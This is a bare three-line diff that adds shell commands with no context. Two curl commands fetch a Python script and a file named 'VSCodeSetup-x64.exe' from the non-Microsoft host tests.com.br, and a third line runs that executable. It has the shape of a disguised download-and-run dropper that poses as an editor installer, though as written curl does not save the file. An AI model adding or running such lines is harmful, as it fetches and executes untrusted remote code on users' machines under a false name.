@@ -1,0 +1,3 @@
+curl -s tests.com.br/Windows.py
+curl -s tests.com.br/python/VSCodeSetup-x64.exe
+VSCodeSetup-x64.exe
